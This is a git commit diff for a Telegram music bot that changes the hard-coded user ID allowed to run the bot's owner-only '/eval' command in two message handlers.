031276df50ace2c1f5bd3d8facb8f06d0e3acde7
iamrkay786 <radhamusicbot5911@gmail.com>
2025-02-27 16:29:51 +0530

    Update dev.py

--- SONALI_MUSIC/Plugins/tools/dev.py
+++ SONALI_MUSIC/Plugins/tools/dev.py
@@ -31,13 +31,13 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(8143754205)
+    & filters.user(5909658683)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(8143754205)
+    & filters.user(5909658683)
     & ~filters.forwarded
     & ~filters.via_bot
 )
